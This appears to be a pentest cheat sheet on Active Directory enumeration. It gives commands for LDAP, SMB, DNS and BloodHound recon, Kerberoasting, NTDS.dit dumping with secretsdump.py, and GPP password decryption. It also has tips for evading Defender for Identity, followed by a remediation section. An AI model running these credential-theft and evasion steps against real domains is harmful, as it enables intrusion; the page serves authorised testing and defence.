# Active Directory Enumeration

> LDAP, SMB, Kerberos, DNS-based enumeration of an AD domain. Authorized testing only. Map: MITRE ATT&CK Discovery (TA0007).

## TL;DR
- Domain controllers expose LDAP (389/636), Kerberos (88), SMB (445), DNS (53) — all enumerable from a domain-joined machine *or* an unauthenticated foothold on the network for SMB/LDAP-anonymous probes.
- BloodHound is the canonical path-mapping tool: ingest with SharpHound (Windows) or BloodHound.py (Linux), explore the Neo4j graph for attack paths to `Domain Admins`.
- Modern realities: defenders use LAPS, gMSAs, Tier-0 isolation, Microsoft Defender for Identity (formerly Azure ATP) — your enumeration will be loud unless you authenticate as low-privileged user.
- Cite OWASP / NIST controls + ASVS-equivalents from CIS Benchmarks (Windows Server / AD DS).

## Detection / Discovery

### Initial Recon (no creds)
| Command | Description |
| --- | --- |
| `nmap -p 53,88,389,445,464,636,3268,3269 <subnet>` | Identify DCs (these ports together = DC) |
| `enum4linux-ng <DC>` | SMB null-session + LDAP anonymous enum |
| `crackmapexec smb <subnet>` (`nxc smb` in NetExec) | SMB host discovery + signing/SMBv1 posture |
| `ldapsearch -x -h <DC> -b "" -s base "(objectclass=*)"` | RootDSE — domain naming context, ldap-bind hints |
| `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>` | DCs via DNS SRV records |
| `dig axfr <domain> @<DC>` | Zone transfer (almost never works on modern AD) |

### Authenticated LDAP / SMB recon
| Command | Description |
| --- | --- |
| `ldapdomaindump -u <domain>\\<user> -p <pass> <DC>` | Full LDAP dump (users, groups, GPOs, computers) into HTML/JSON/grep |
| `crackmapexec ldap <DC> -u <user> -p <pass> --users` | LDAP user enum |
| `crackmapexec smb <DC> -u <user> -p <pass> --shares` | Share enum + read-access check |
| `bloodhound.py -c All -u <user> -p <pass> -d <domain> -ns <DC>` | Linux ingestor → BloodHound JSON |
| `SharpHound.exe -c All --zipfilename out.zip` | Windows ingestor (run on domain-joined host) |
| `Get-DomainComputer \| Select-Object dnshostname,operatingsystem` (PowerView) | Computer inventory |
| `Get-NetGroupMember -GroupName "Domain Admins" -Recurse` (PowerView) | Tier-0 group recursive members |

### BloodHound queries (canned)
After ingesting:
- `Find Shortest Paths to Domain Admins` — built-in left-rail query.
- `MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p` — Kerberoastable to DA.
- `MATCH p=shortestPath((u:User {dontreqpreauth:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p` — AS-REP roastable to DA.

### Useful authenticated enumeration cheats
| Command | Description |
| --- | --- |
| `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC> -request` | Kerberoasting candidate dump (Impacket) — see [./kerberos.md](./kerberos.md) |
| `GetNPUsers.py <domain>/ -usersfile users.txt -no-pass` | AS-REP roasting candidates (no preauth) |
| `secretsdump.py <domain>/<user>:<pass>@<DC>` | NTDS.dit + LSA + SAM (if privileged) |
| `lookupsid.py <domain>/<user>:<pass>@<DC>` | SID-history / RID brute force |
| `adidnsdump -u <domain>\\<user> -p <pass> <DC>` | DNS records inside AD-integrated zones |
| `pyGPOAbuse` / `Get-GPO` | GPO content (rare-permissions abuse) |

### Tier-0 / privileged groups to confirm
- **Domain Admins**, **Enterprise Admins**, **Schema Admins**, **BUILTIN\Administrators** (DC-local).
- **Backup Operators**, **Server Operators**, **Account Operators** — often-overlooked Tier-0 equivalent groups.
- **Domain Controllers** computer group + any computer with `Replicating Directory Changes` rights (DCSync surface).

### Credential exposure hotspots
| Place | Why |
| --- | --- |
| GPO Preferences (`SYSVOL\<domain>\Policies\.../Groups.xml`) | MS14-025 — XOR-decryptable cpassword. `gpp-decrypt` recovers them. |
| AD object descriptions / `comment` attribute | Operators sometimes stuff passwords there. Search with `Get-ADUser -Filter * -Properties Description` or LDAP filter. |
| Service-account `userPassword` attribute (LDAP) | Rare but exists; check on legacy domains. |
| SCCM site server | LAPS-protected workstations enumerable; SCCM creds extractable from misconfigured site DBs. |
| LAPS-managed admin passwords | If you have `ReadLAPSPassword` extended right → cleartext local admin per host. |

## Bypasses
- Microsoft Defender for Identity catches noisy LDAP enumeration (millions of objects in seconds). Throttle SharpHound `--Throttle 1000` and limit collection methods to `--CollectionMethods Group,Acl,Trusts` first.
- Modern AD has SMBv1 disabled — fall back to LDAP for enumeration; null-session SMB is increasingly blocked.
- `samr` enumeration via `rpcclient` may be denied; `lsa` enumeration usually still works for SID lookups.
- "Restricted RPC" mitigations (`ProtectedFromAccidentalDeletion`, `RestrictRemoteSAM`) — fall back to LDAP read.

## Defence / Remediation
- **Microsoft Defender for Identity** + Defender XDR — flags reconnaissance patterns (LDAP enumeration bursts, DCSync, golden-ticket usage).
- **Tier-0 isolation**: PAW (privileged access workstation) model; no DA login on user workstations; per-host LAPS; admin tier separation per Microsoft's Privileged Access strategy.
- **Replace legacy** GPP cpassword usage (MS14-025 — already deprecated since 2014; audit SYSVOL for residual `cpassword` strings).
- **Disable LAN Manager auth** (`NoLMHash=1`); enforce SMB signing on DCs (`RequireSecuritySignature=1`).
- **Audit and limit ACLs** with `Restrict-DACL` reviews — BloodHound exposes risky ACL paths (GenericAll on Domain Admins, WriteOwner on Tier-0 OUs).
- **Honey accounts** (Kerberoastable / AS-REPable accounts with no real privilege but high-fidelity alerts on enumeration / ticket request).
- **Audit logging** at the DC level (event IDs 4624/4625/4768/4769/4770/4771) shipped to SIEM with anomaly detection.

## Sources
- BloodHound documentation: https://bloodhound.specterops.io/
- SpecterOps "BloodHound CE": https://github.com/SpecterOps/BloodHound
- HackTricks Active Directory: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- ired.team — AD attacks: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
- harmj0y posts (PowerView, Rubeus, Kerberos): https://harmj0y.medium.com/
- Microsoft — Active Directory security best practices: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory
- Microsoft Defender for Identity: https://learn.microsoft.com/en-us/defender-for-identity/
- MITRE ATT&CK Discovery (TA0007): https://attack.mitre.org/tactics/TA0007/
